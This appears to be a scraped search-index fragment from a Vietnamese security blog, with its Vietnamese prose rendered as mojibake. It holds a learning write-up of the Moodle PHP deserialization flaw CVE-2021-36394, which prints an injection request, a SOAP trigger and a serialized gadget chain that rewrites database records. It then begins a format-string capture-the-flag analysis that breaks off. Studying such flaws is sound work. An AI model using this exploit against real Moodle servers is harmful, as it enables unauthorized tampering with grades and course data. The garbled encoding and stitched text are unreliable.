(Do ƒë√≥, ·ªü ph·∫ßn setup m√¥i tr∆∞·ªùng, ch√∫ng ta ph·∫£i b·∫≠t plugin n√†y l√™n m·ªõi reproduce ƒë∆∞·ª£c)\n1 2 3 4  // If the shibboleth plugin is not enable, throw an exception.\rif (!is_enabled_auth(\u0026#39;shibboleth\u0026#39;)) {\rthrow new moodle_exception(get_string(\u0026#39;pluginnotenabled\u0026#39;, \u0026#39;auth\u0026#39;, \u0026#39;shibboleth\u0026#39;));\r}\r    L·∫•y gi√° tr·ªã truy·ªÅn v√†o $inputstream v√† ki·ªÉm tra c√¢u l·ªánh r·∫Ω nh√°nh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // Front channel logout.\r$inputstream = file_get_contents(\u0026#34;php://input\u0026#34;);\rif ($action == \u0026#39;logout\u0026#39; \u0026amp;\u0026amp; !empty($redirect)) {\rif (isloggedin($USER) \u0026amp;\u0026amp; $USER-\u0026gt;auth == \u0026#39;shibboleth\u0026#39;) {\r// Logout user from application.\rrequire_logout();\r}\r// Finally, send user to the return URL.\rredirect($redirect);\r} else if (!empty($inputstream)) {\r// Back channel logout.\r// Set SOAP header.\r$server = new SoapServer($protocol.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].$_SERVER[\u0026#39;PHP_SELF\u0026#39;].\u0026#39;/LogoutNotification.wsdl\u0026#39;);\r$server-\u0026gt;addFunction(\u0026#34;LogoutNotification\u0026#34;);\r$server-\u0026gt;handle();\r} else {\r// Return WSDL.\r    V√¨ m·ª•c ti√™u c·ªßa ch√∫ng ta n·∫±m ·ªü nh√°nh th·ª© 2 ƒë·ªÉ g·ªçi h√†m LogoutNotification n√™n ch√∫ng ta truy·ªÅn v√†o action=logout v√† $redirect=null (t·ª©c l√† kh√¥ng c·∫ßn truy·ªÅn v√†o). M·ªçi th·ª© so easy, nh∆∞ng v·ªõi 1 newbiee PHP nh∆∞ t√¥i th√¨ SoapServer ·ªü d√≤ng 18 c≈©ng nh∆∞ h√†m nh·∫≠p ·ªü d√≤ng 2 kh√° l·∫° l·∫´m. Do ƒë√≥ tr∆∞·ªõc khi ti·∫øp t·ª•c t√¥i ph·∫£i ƒëi t√¨m hi·ªÉu SoapServer l√† g√¨ v√† truy·ªÅn gi√° tr·ªã v√†o $inputstream l√† g√¨ m·ªõi h·ª£p l·ªá.\n  1 2  // Front channel logout.\r$inputstream = file_get_contents(\u0026#34;php://input\u0026#34;);\r   N·∫øu ng√†y x∆∞a ch√∫ng ta c√≥ c√¢u: ‚Äúc√°i g√¨ kh√¥ng bi·∫øt th√¨ tra google‚Äù th√¨ ng√†y nay tr∆∞·ªõc khi tra google ch√∫ng ta c√≥ th·ªÉ ƒëi h·ªèi anh b·∫°n chatgpt r·ªìi sau ƒë√≥ google ƒë·ªÉ ki·ªÉm ch·ª©ng hi·ªÉu r√µ h∆°n   chapgpt\nfile_get_contents(\u0026quot;php://input\u0026quot;) l√† m·ªôt h√†m trong PHP ƒë·ªÉ ƒë·ªçc d·ªØ li·ªáu t·ª´ body c·ªßa HTTP request. Khi b·∫°n g·ª≠i m·ªôt HTTP request t·ª´ m·ªôt client (v√≠ d·ª• nh∆∞ tr√¨nh duy·ªát web) t·ªõi m·ªôt server, n·ªôi dung c·ªßa request ƒë∆∞·ª£c ƒë∆∞a v√†o body c·ªßa request.\nTrong PHP, \u0026quot;php://input\u0026quot; l√† m·ªôt stream wrapper, cho ph√©p ƒë·ªçc d·ªØ li·ªáu t·ª´ body c·ªßa request b·∫±ng c√°ch ƒë·ªçc d·ªØ li·ªáu t·ª´ m·ªôt input stream.\nDo ƒë√≥, khi s·ª≠ d·ª•ng file_get_contents(\u0026quot;php://input\u0026quot;), b·∫°n ƒëang y√™u c·∫ßu PHP ƒë·ªçc d·ªØ li·ªáu t·ª´ body c·ªßa request v√† tr·∫£ v·ªÅ d·ªØ li·ªáu d∆∞·ªõi d·∫°ng m·ªôt chu·ªói (string). B·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng k·∫øt qu·∫£ n√†y ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu c·ªßa request trong ·ª©ng d·ª•ng PHP c·ªßa m√¨nh.\n  D·ªÖ hi·ªÉu ƒë√¢y l√† c√°ch ƒë·ªÉ ƒë·ªçc gi√° tr·ªã th√¥i, v√†o ƒë·ªÉ truy·ªÅn b·∫±ng RESTAPI th√¨ ta c·∫ßn d√πng POST method C√≤n v·ªõi soap th√¨ t√¥i ƒë·ªçc tr√™n w3schools: https://www.w3schools.com/xml/xml_soap.asp V·ªÅ c∆° b·∫£n, XML SOAP (Simple Object Access Protocol) l√† m·ªôt chu·∫©n giao th·ª©c ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ trao ƒë·ªïi d·ªØ li·ªáu gi·ªØa c√°c ·ª©ng d·ª•ng ph·∫ßn m·ªÅm kh√°c nhau. N√≥ s·ª≠ d·ª•ng ng√¥n ng·ªØ XML ƒë·ªÉ m√£ h√≥a d·ªØ li·ªáu v√† c√°c th√¥ng ƒëi·ªáp truy·ªÅn t·∫£i gi·ªØa c√°c h·ªá th·ªëng kh√°c nhau th√¥ng qua giao th·ª©c HTTP ho·∫∑c c√°c giao th·ª©c kh√°c. ƒê·ªçc hi·ªÉu 1 t√≠, ta c√≥ th·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c payload truy·ªÅn v√†o l√†  1 2 3 4 5 6  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\r\u0026lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\u0026lt;SOAP-ENV:Body\u0026gt;\r\u0026lt;LogoutNotification\u0026gt;\r\u0026lt;spsessionid\u0026gt;sssssu\u0026lt;/spsessionid\u0026gt;\r\u0026lt;/LogoutNotification\u0026gt;\r\u0026lt;/SOAP-ENV:Body\u0026gt;\u0026lt;/SOAP-ENV:Envelope\u0026gt;\r  Trong ƒë√≥, \u0026lt;LogoutNotification\u0026gt; l√† request ch√∫ng ta mu·ªën g·ªçi v√† \u0026lt;spsessionid\u0026gt; l√† tham s·ªë c·ªßa function n√†y\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  /******************************************************************************/\r/**\r* Handles SOAP Back-channel logout notification\r*\r* @param string $spsessionid SP-provided Shibboleth Session ID\r* @return SoapFault or void if everything was fine\r*/\rfunction LogoutNotification($spsessionid) {\r$sessionclass = \\core\\session\\manager::get_handler_class();\rswitch ($sessionclass) {\rcase \u0026#39;\\core\\session\\file\u0026#39;:\rreturn \\auth_shibboleth\\helper::logout_file_session($spsessionid);\rcase \u0026#39;\\core\\session\\database\u0026#39;:\rreturn \\auth_shibboleth\\helper::logout_db_session($spsessionid);\rdefault:\rthrow new moodle_exception(\u0026#34;Shibboleth logout not implemented for \u0026#39;$sessionclass\u0026#39;\u0026#34;);\r}\r// If no SoapFault was thrown, the function will return OK as the SP assumes.\r}\r      Truy·ªÅn payload v√† ki·ªÉm tra input c·ªßa h√†m unserialize()\nNh∆∞ v·∫≠y, ƒë·ªÉ control input v√†o h√†m unserialize() ch√∫ng ta c·∫ßn 2 payload\n payload1: method GET, m·ª•c ti√™u vi·∫øt payload xu·ªëng session payload2: method POST, m·ª•c ti√™u trigger payload qua h√†m unserialize()    Nh∆∞ v·∫≠y, trong ph·∫ßn n√†y ch√∫ng ta ƒë√£ th√†nh c√¥ng trong vi·ªác control input v√†o h√†m unserialize(), b∆∞·ªõc ti·∫øp theo ti·∫øn h√†nh x√¢y d·ª±ng payload khai th√°c.\nIII. Khai th√°c b·∫±ng k·ªπ thu·∫≠t POP M·ª•c ti√™u c·ªßa k·ªπ thu·∫≠t n√†y m√¨nh s·∫Ω t·∫°o m·ªôt gadget chains ƒë·ªÉ exploit\n gadget chains l√† m·ªôt d√£y g·ªìm c√°c ph∆∞∆°ng th·ª©c c√≥ kh·∫£ nƒÉng g·ªçi l·∫´n nhau. C√°c ph∆∞∆°ng th·ª©c n√†y c√≥ th·ªÉ c√πng ho·∫∑c kh√°c l·ªõp. T√πy thu·ªôc v√†o m√£ ngu·ªìn m√† c√°c chu·ªói ph∆∞∆°ng th·ª©c c√≥ th·ªÉ g√¢y ra s·ª± ·∫£nh h∆∞·ªüng ƒë·ªëi v·ªõi ·ª©ng d·ª•ng √≠t ho·∫∑c nhi·ªÅu.\n Ta s·∫Ω chia ra l√†m 2 ph·∫ßn: First Link v√† Next Link trong ƒë√≥ first link l√† class ta truy·ªÅn v√†o h√†m unserialize() v·ªõi m·ª•c ti√™u s·∫Ω trigger c√°c magic method nh∆∞ __destruct() ƒë·ªÉ g·ªçi chu·ªói class kh√°c (Next Link)\nFirst Link Khi ·ª©ng d·ª•ng m·∫Øc l·ªói PHP deserialize, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ th√™m b·∫•t k√¨ ƒë·ªëi t∆∞·ª£ng n√†o v√†o th·ªùi gian th·ª±c thi th·ª±c c·ªßa ch∆∞∆°ng tr√¨nh, qua ƒë√≥ l√†m thay ƒë·ªïi t√≠nh logic v√† c√°c lu·ªìng th·ª±c thi trong ·ª©ng d·ª•ng th√¥ng qua c√°c c√°ch sau:\n  Ch√®n c√°c ƒë·ªëi t∆∞·ª£ng c·ªßa c√°c l·ªõp c√≥ ƒë·ªãnh nghƒ©a c√°c ph∆∞∆°ng th·ª©c t·ª± ƒë·ªông (magic method) ch·∫Øc ch·∫Øn s·∫Ω ƒë∆∞·ª£c g·ªçi sau khi ch∆∞∆°ng tr√¨nh k·∫øt th√∫c nh∆∞ __destruct() hay __wakeup() khi ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c t·∫°o ra th√¥ng qua h√†m unserialize(). Khi ƒë√≥, ch∆∞∆°ng tr√¨nh s·∫Ω c√≥ th·ªÉ g·ªçi h√†ng lo·∫°t c√°c h√†m kh√°c t√πy thu·ªôc v√†o c√°c l·ªánh trong nh·ªØng ph∆∞∆°ng th·ª©c n√†y.\nNgo√†i c√°c magic method th√¥ng d·ª•ng nh∆∞ __destruct() __wakeup() th√¨ c√≤n c√≥ m·ªôt s·ªë magic method kh√°c ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞:\n1 2 3 4  __toString()\r__call()\r__set()\r__get(\r    Ch√®n c√°c ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c m√£ ngu·ªìn th·ª±c thi m·ªôt ph∆∞∆°ng th·ª©c n√†o ƒë√≥. T∆∞∆°ng t·ª± nh∆∞ tr√™n, h√†ng lo·∫°t c√°c ph∆∞∆°ng th·ª©c kh√°c s·∫Ω ƒë∆∞·ª£c g·ªçi v√† c√≥ th·ªÉ d·∫´n t·ªõi thay ƒë·ªïi lu·ªìng ho·∫°t ƒë·ªông c·ªßa ch∆∞∆°ng tr√¨nh.\n  Trong m√£ ngu·ªìn logout_file_session kh√¥ng c√≥ thao th√°c ng·∫ßm √©p ki·ªÉu ƒë·ªÉ g·ªçi t·ªõi __toString()\n  Ta t√¨m __destruct() trong source code, t·∫°i c√°c folder */classes/*\n  question: T·∫°i sao ch·ªâ t√¨m trong c√°c folder */classes/*?\nƒê·ªÉ ki·ªÉm ch·ª©ng, ta s·∫Ω th·ª≠ truy·ªÅn class c√≥ method __destruct() kh√°c v·ªõi c√°c class n·∫±m trong c√°c folder */classes/* ƒë·ªÉ xem th·ª≠ c√≥ trigger kh√¥ng! T√¥i ƒë√£ l√†m v√† k·∫øt qu·∫£ l√† kh√¥ng trigger üòÑ\nB√¢y gi·ªù c≈©ng l√†m t∆∞∆°ng t·ª± b∆∞·ªõc tr√™n, nh∆∞ng ta s·∫Ω s·ª≠a m√£ ngu·ªìn 1 t√≠: t·∫°i n∆°i trigger h√†m unserialize() ta th√™m d√≤ng l·ªánh\n1  include_once(\u0026#39;/var/www/html/moodle/backup/cc/cc_lib/xmlbase.php\u0026#39;)\r  V√¢ng! n√≥ trigger ƒë∆∞·ª£c! Sau ƒë√≥, t√¥i ƒëi t√¨m hi·ªÉu kƒ© th√¨ c√≥ k·∫øt lu·∫≠n nh∆∞ sau:\n M·∫∑c ƒë·ªãnh 1 class ch·ªâ c√≥ th·ªÉ g·ªçi nh·ªØng class n·∫±m trong c√πng th∆∞ m·ª•c ho·∫∑c c√πng namespace. M·∫∑c ƒë·ªãnh c·ªßa Moodle, m·ªçi class ƒë·ªÅu c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c c√°c class n·∫±m ·ªü folder c√≥ d·∫°ng ***/classes/*** Ch√∫ng ta c√≥ th·ªÉ g·ªçi t·ªõi 1 class b·∫•t k√¨ kh√¥ng n·∫±m trong ***/classes/*** khi class ƒë√≥ ƒë∆∞·ª£c import v√†o ƒëo·∫°n code (th√¥ng qua h√†m **require_once() ho·∫∑c include_once()**    Sau khi ƒë·ªçc code 3 h√†m n√†y th√¨ link duy nh·∫•t \\core\\lock\\lock() c√≥ kh·∫£ nƒÉng ·ª©ng c·ª≠ v√¨ s·ª≠ d·ª•ng √©p ki·ªÉu string th√¥ng qua c·ªông chu·ªói.\n   T·ªõi ƒë√¢y ch·ªâ c·∫ßn $this-\u0026gt;caller tr·ªè t·ªõi Next Link, m√¨nh c√≥ th·ªÉ g·ªçi 1 class kh√°c ch·ª©a chain __toString()  Next Link  search __toString() tr√™n to√†n b·ªô source code.  V·ªõi 136 k·∫øt qu·∫£ s·∫Ω l√†m ƒëa d·∫°ng ho√° gadget chain.\nM·ª•c ƒë√≠ch c·ªßa c√°i search n√†y theo m√¨nh l√† ch·ªâ cho th·∫•y l√† c√≥ nhi·ªÅu gadget chain ƒë·ªÉ exploit th√¥i ch·ª© c≈©ng c√≥ g√¨ :)))\nT√°c gi·∫£ d·ª±a tr√™n 1 gadget chain c·ªßa 1 b√†i blog Moodle ‚Äì Remote Code Execution ƒë·ªÉ modify l·∫°i. Do ƒë√≥, ƒë·ªÉ hi·ªÉu ƒë∆∞·ª£c payload t√¥i c·∫ßn ph·∫£i t√¨m hi·ªÉu blog tr√™n. M·ªôt s·ªë nh·∫≠n x√©t sau khi ƒë·ªçc blog nh∆∞ sau:\n  Chain n√†y s·ª≠ d·ª•ng __toString() c·ªßa attribute_format v·ªõi hi·ªán th·ª±c nh∆∞ sau:\n1 2 3  public function __toString() {\rreturn $this-\u0026gt;determine_format()-\u0026gt;html();\r}\r   T√¥i t√¨m ki·∫øm tr√™n to√†n b·ªô source code th√¨ th·∫•y h√†m n√†y n·∫±m ·ªü moodle/grade/report/singleview/classes/local/ui/attribute_format.php    __toString() ƒë∆∞·ª£c g·ªçi khi ch∆∞∆°ng tr√¨nh th·ª±c hi·ªán 1 ph√©p n·ªëi chu·ªói v·ªõi bi·∫øn c√≥ gi√° tr·ªã kh√¥ng ph·∫£i chu·ªói. Ch∆∞∆°ng tr√¨nh s·∫Ω g·ªçi __toString() ƒë·ªÉ ki·ªÉm tra ki·ªÉu v√† convert sang chu·ªói\n1 2 3 4 5 6  function block_course_overview_update_myorder($sortorder) {\r// $sortorder is our unserialized payload.\r$value = implode(\u0026#39;,\u0026#39;, $sortorder);\r...\rset_user_preference(\u0026#39;course_overview_course_sortorder\u0026#39;, $value);\r}\r    Ng·ªØ c·∫£nh n√†y gi·ªëng v·ªõi ng·ªØ c·∫£nh c·ªßa ch√∫ng ta khi Firstlink __destruct() t·∫°i \\core\\lock\\lock() c≈©ng th·ª±c hi·ªán n·ªëi chu·ªói v·ªõi this‚Üícaller (Gi√° tr·ªã this-\u0026gt;caller ƒë∆∞·ª£c ki·ªÉm so√°t b·ªüi ch√∫ng ta)\n    Follow c·ªßa _toString() nh∆∞ sau:\n1 2 3 4 5 6 7 8  __toString()\r‚îî‚îÄ‚îÄ determine_format()\r‚îî‚îÄ‚îÄ is_disabled()\r‚îú‚îÄ‚îÄ is_overridable_item()\r‚îî‚îÄ‚îÄ set_calculation()\r‚îú‚îÄ‚îÄ get_record_data()\r‚îî‚îÄ‚îÄ update()\r  M·ª•c ti√™u s·∫Ω truy·ªÅn v√†o gi√° tr·ªã v√†o h√†m update() ƒë·ªÉ thay c·∫≠p nh·∫≠t gi√° tr·ªã d∆∞·ªõi DB.\n  Chain n√†y m·ª•c ƒë√≠ch l√† thay ƒë·ªïi d·ªØ li·ªáu ·ªü d∆∞·ªõi db. Trong b√†i n√†y, m·ª•c ti√™u ta s·∫Ω s·ª≠a ƒë·ªïi t√™n n·ªôi dung kh√≥a h·ªçc ·ªü 2 class \\grade_grade v√† \\grade_item Tuy nhi√™n, __toString() c·ªßa attribute_format kh√¥ng g·ªçi ƒë∆∞·ª£c v√¨ 2 class \\grade_grade v√† \\grade_item n·∫±m ngo√†i folder */classes/*. Do ƒë√≥, ƒë·ªÉ g·ªçi ƒë∆∞·ª£c, ch√∫ng ta c·∫ßn ph·∫£i g·ªçi class kh√°c ch∆∞a h√†m include class tr√™n.\n1 2 3 4 5 6 7 8 9 10  /lib/grade/grade_grade.php ^\r|\r/lib/gradelib.php ^\r|\r/analytics/classes/course.php ^\r|\r\\core_analytics\\course\r  -\u0026gt; G·ªçi class \\core_analytics\\course s·∫Ω include file /lib/grade/grade_grade.php, sau ƒë√≥ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c class \\grade_grade\nT∆∞∆°ng t·ª± v·ªõi grade_item\n1 2 3 4 5 6 7 8 9 10  /lib/grade/grade_item.php ^\r|\r/lib/gradelib.php ^\r|\r/analytics/classes/course.php\r^\r|\r\\core_analytics\\course\r  -\u0026gt; G·ªçi class \\core_analytics\\course s·∫Ω include file /lib/grade/grade_item.php, sau ƒë√≥ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c class \\grade_item\n  Vi·∫øt exploit  yeah, m·ªçi th·ª© ƒë√£ clear r·ªìi. B√¢y gi·ªù th√¨ vi·∫øt exploit    Inject payload\n1 2 3 4 5 6 7 8 9 10  function httpGet($url, $MoodleSession)\r{\r$curl = curl_init($url);\r$headers = array(\u0026#39;Cookie: MoodleSession=\u0026#39;.$MoodleSession);\rcurl_setopt($curl, CURLOPT_HTTPHEADER, $headers);\rcurl_setopt($curl, CURLOPT_RETURNTRANSFER, true);\r$response = curl_exec($curl);\rcurl_close($curl);\rreturn $response;\r}\r  v·ªõi l·ªùi g·ªçi h√†m nh∆∞ sau:\n1  httpGet($url.\u0026#39;/grade/report/grader/index.php?id=1\u0026amp;sifirst=Testaaaaa|\u0026#39;.$value.\u0026#34;Testbbbbbb|\u0026#34;, $MoodleSession);\r  Trong ƒë√≥, $value l√† payload ƒë√£ ƒë∆∞·ª£c serialize\n  Trigger payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  function httpPost($url, $data, $MoodleSession, $xml)\r{\r$curl = curl_init($url);\r$headers = array(\u0026#39;Cookie: MoodleSession=\u0026#39;.$MoodleSession);\rif($xml){\rarray_push($headers, \u0026#39;Content-Type: application/xml\u0026#39;);\r}else{\r$data = urldecode(http_build_query($data));\r}\rcurl_setopt($curl, CURLOPT_POST, true);\rcurl_setopt($curl, CURLOPT_HTTPHEADER, $headers);\rcurl_setopt($curl, CURLOPT_POSTFIELDS, $data);\rcurl_setopt($curl, CURLOPT_RETURNTRANSFER, true);\r// curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy\r$response = curl_exec($curl);\rcurl_close($curl);\rreturn $response;\r}\r  V·ªõi l·ªùi g·ªçi h√†m nh∆∞ sau:\n1 2 3 4 5  echo \u0026#34;\\n [*] Trigger Payload \u0026#34;;\r$data = \u0026#39;\u0026lt;s:Envelope xmlns:s=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\u0026lt;s:Body\u0026gt;\r\u0026lt;LogoutNotification\u0026gt;\u0026lt;SessionID\u0026gt;ssss\u0026lt;/SessionID\u0026gt;\r\u0026lt;/LogoutNotification\u0026gt;\u0026lt;/s:Body\u0026gt;\u0026lt;/s:Envelope\u0026gt;\u0026#39;;\rhttpPost($url.\u0026#39;/auth/shibboleth/logout.php\u0026#39;, $data, $MoodleSession, 1);\r  Yeah, Inject payload v√† trigger payload kh√° ƒë∆°n gi·∫£n. C√¢u chuy·ªán l√† payload ch√∫ng ta inject nh∆∞ th·∫ø n√†o\n  X√¢y d·ª±ng payload $value\n  Nh∆∞ ƒë√£ tr√¨nh b√†y ·ªü tr√™n, khi h√†m unserialize() ch·∫°y payload c·ªßa ch√∫ng ta, m·ª•c ti√™u n√≥ s·∫Ω trigger FirsLink ·ªü \\core\\lock\\lock(), ƒê·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu ƒë√≥, ta x√¢y d·ª±ng nh∆∞ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  namespace core\\lock {\rclass lock {}\r}\rfunction update_table($url, $MoodleSession, $table, $rowId, $column, $value){\r$add_lib = new \\core_analytics\\course();\r$lib_fb = new \\core\\lock\\lock();\r$base = new gradereport_overview_external();\r$fb = new gradereport_singleview\\local\\ui\\feedback();\r$fb -\u0026gt; grade = new grade_grade();\r$fb -\u0026gt; grade -\u0026gt; grade_item = new grade_item();\r$fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; calculation = \u0026#34;[[somestring\u0026#34;;\r$fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; calculation_normalized = false;\r$fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; table = $table;\r$fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; id = $rowId;\r$fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; $column = $value;\r$fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; required_fields = array($column,\u0026#39;id\u0026#39;);\r$lib_fb -\u0026gt; caller = $fb; // set caller to gradereport_singleview\\local\\ui\\feedback()\r$arr = array($add_lib, $lib_fb,$base);\r}\r$value = serialize($arr);\r   T·∫°o ra 1 $lib_fb l√† class \\core\\lock\\lock() T·∫°o class $fb l√† gradereport_singleview\\local\\ui\\feedback() c√πng c√°c gi√° tr·ªã t∆∞∆°ng ·ª©ng r·ªìi g√°n v√†o $lib_fb -\u0026gt; caller ƒë·ªÉ h√†m _destruct() th·ª±c thi s·∫Ω ƒëi v√†o __toString() c·ªßa feedback Trong ƒëo·∫°n code tr√™n, $add_lib ƒë∆∞·ª£c t·∫°o ƒë·ªÉ include th∆∞ vi·ªán, h·ªó tr·ª£ g·ªçi 2 class \\grade_grade v√† \\grade_item Trong exploit c√≤n c√≥ $base nh∆∞ng t√¥i th·∫•y v·ªõi m·ª•c ti√™u exploit thay ƒë·ªïi course name th√¨ kh√¥ng c·∫ßn thi·∫øt, lib n√†y s·∫Ω ph·ª•c v·ª• m·ª•c ti√™u kh√°c c·ªßa t√°c gi·∫£ cho nh·ªØng m·ª•c ƒë√≠ch exploit kh√°c      ","description":"CVE-2021-36394 l√† m·ªôt l·ªó h·ªïng tr√™n n·ªÅn t·∫£ng Moodle. ƒê√¢y l√† m·ªôt trong nh·ªØng CVE th√≠ch h·ª£p cho nh·ªØng ng∆∞·ªùi m·ªõi b·∫Øt ƒë·∫ßu t√¨m hi·ªÉu v·ªÅ PHP deserialize!","id":1,"section":"posts","tags":["cve, php"],"title":"Khi newbie h·ªçc PHP deserialize","uri":"https://minhlongmt183.github.io/posts/cve-2021-36394-moodle-cve/"},{"content":"B∆∞·ªõc 1 - Ph√¢n t√≠ch  ƒê·∫ßu ti√™n, ch√∫ng ta ki·ªÉm tra checksec c·ªßa t·ªáp tin  1 2 3 4 5 6 7  ‚ûú Format git:(main) ‚úó checksec format [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39;\rArch: amd64-64-little\rRELRO: Full RELRO\rStack: Canary found\rNX: NX enabled\rPIE: PIE enabled\r   D·ªÖ d√†ng th·∫•y h·∫ßu h·∫øt c√°c c∆° ch·∫ø b·∫£o m·∫≠t ƒë·ªÅu ƒë∆∞·ª£c b·∫≠t ·ªü tr√™n t·ªáp tin n√†y. T·ª±a ƒë·ªÅ l√† format, n√™n ta d·ªÖ d√†ng bi·∫øt ƒë∆∞·ª£c ƒë√¢y thu·ªôc lo·∫°i l·ªói format-string  1 2 3  ‚ûú Format git:(main) ‚úó ./format\r%x.%x.%x.%x\rf0623a03.0.f0549142.3a1b8000\r   Ta m·ªü b·∫±ng ghidra:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  undefined8 main(EVP_PKEY_CTX *param_1)\r{\rlong lVar1;\rlong in_FS_OFFSET;\rlVar1 = *(long *)(in_FS_OFFSET + 0x28);\rinit(param_1);\recho();\rif (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\r/* WARNING: Subroutine does not return */\r__stack_chk_fail();\r}\rreturn 0;\r}\r  1 2 3 4 5 6 7 8 9 10 11 12 13  void echo(void)\r{\rlong in_FS_OFFSET;\rchar local_118 [264];\rundefined8 local_10;\rlocal_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);\rdo {\rfgets(local_118,0x100,stdin);\rprintf(local_118);\r} while( true );\r}\r   L·ªói n√†y cho ph√©p ch√∫ng ta ƒë·ªçc ƒë∆∞·ª£c d·ªØ li·ªáu tr√™n stack. M·ªü tr√™n gdb, ƒë·∫∑t breakpoint t·∫°i printf c·ªßa h√†n echo. Ch·∫°y, nh·∫≠p input v√† d√πng l·ªánh x/100gx $rsp ƒë·ªÉ in ra d·ªØ li·ªáu tr√™n stack v√† quan s√°t.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  pwndbg\u0026gt; x/100gx $rsp\r0x7fffffffdc10:\t0x4141414141414141\t0x4141414141414141\r0x7fffffffdc20:\t0x0000000a61414141\t0x0000038000000380\r0x7fffffffdc30:\t0x0000038000000380\t0x0000038000000380\r0x7fffffffdc40:\t0x0000038000000380\t0x0000038000000380\r0x7fffffffdc50:\t0x0000038000000380\t0x0000038000000380\r0x7fffffffdc60:\t0x0000038000000380\t0x0000038000000380\r0x7fffffffdc70:\t0x0000038000000380\t0x0000038000000380\r0x7fffffffdc80:\t0x0000000000000000\t0x00007ffff7fa85c0\r0x7fffffffdc90:\t0x0000000000000000\t0x00007ffff7e516a5\r0x7fffffffdca0:\t0x0000000000000000\t0x00007ffff7fa85c0\r0x7fffffffdcb0:\t0x0000000000000000\t0x0000000000000000\r0x7fffffffdcc0:\t0x00007ffff7fa94a0\t0x00007ffff7e4d6bd\r0x7fffffffdcd0:\t0x00007ffff7fa85c0\t0x00007ffff7e43f65\r0x7fffffffdce0:\t0x00005555555552d0\t0x00007fffffffdd20\r0x7fffffffdcf0:\t0x00005555555550c0\t0x00007fffffffde30\r0x7fffffffdd00:\t0x0000000000000000\t0x000055555555526d\r0x7fffffffdd10:\t0x00007ffff7facfc8\t0xc53e05bd2bae9300\r0x7fffffffdd20:\t0x00007fffffffdd40\t0x00005555555552b3\r0x7fffffffdd30:\t0x00007fffffffde30\t0xc53e05bd2bae9300\r0x7fffffffdd40:\t0x0000000000000000\t0x00007ffff7de30b3\r0x7fffffffdd50:\t0x00007ffff7ffc620\t0x00007fffffffde38\r0x7fffffffdd60:\t0x0000000100000000\t0x0000555555555284\r0x7fffffffdd70:\t0x00005555555552d0\t0xbca385af5106ab45\r0x7fffffffdd80:\t0x00005555555550c0\t0x00007fffffffde30\r0x7fffffffdd90:\t0x0000000000000000\t0x0000000000000000\r0x7fffffffdda0:\t0x435c7a50eba6ab45\t0x435c6a1331c8ab45\r0x7fffffffddb0:\t0x0000000000000000\t0x0000000000000000\r0x7fffffffddc0:\t0x0000000000000000\t0x0000000000000001\r0x7fffffffddd0:\t0x00007fffffffde38\t0x00007fffffffde48\r0x7fffffffdde0:\t0x00007ffff7ffe190\t0x0000000000000000\r0x7fffffffddf0:\t0x0000000000000000\t0x00005555555550c0\r0x7fffffffde00:\t0x00007fffffffde30\t0x0000000000000000\r0x7fffffffde10:\t0x0000000000000000\t0x00005555555550ee\r0x7fffffffde20:\t0x00007fffffffde28\t0x000000000000001c\r0x7fffffffde30:\t0x0000000000000001\t0x00007fffffffe1be\r0x7fffffffde40:\t0x0000000000000000\t0x00007fffffffe1fa\r0x7fffffffde50:\t0x00007fffffffe206\t0x00007fffffffe214\r0x7fffffffde60:\t0x00007fffffffe227\t0x00007fffffffe23c\r0x7fffffffde70:\t0x00007fffffffe244\t0x00007fffffffe256\r0x7fffffffde80:\t0x00007fffffffe292\t0x00007fffffffe29a\r0x7fffffffde90:\t0x00007fffffffe2b1\t0x00007fffffffe2cd\r0x7fffffffdea0:\t0x00007fffffffe2ed\t0x00007fffffffe309\r0x7fffffffdeb0:\t0x00007fffffffe329\t0x00007fffffffe334\r0x7fffffffdec0:\t0x00007fffffffe344\t0x00007fffffffe356\r0x7fffffffded0:\t0x00007fffffffe3b2\t0x00007fffffffe3d0\r0x7fffffffdee0:\t0x00007fffffffe3e4\t0x00007fffffffe41a\r0x7fffffffdef0:\t0x00007fffffffe42c\t0x00007fffffffe43b\r0x7fffffffdf00:\t0x00007fffffffe479\t0x00007fffffffe490\r0x7fffffffdf10:\t0x00007fffffffe4c3\t0x00007fffffffe4da\r0x7fffffffdf20:\t0x00007fffffffe4ea\t0x00007fffffffe4fe\r   Ch√∫ng ta th·∫•y c√≥ 1 v√†i gi√° tr·ªã c√≥ ƒë·ªãa ch·ªâ l√† 0x5555*** 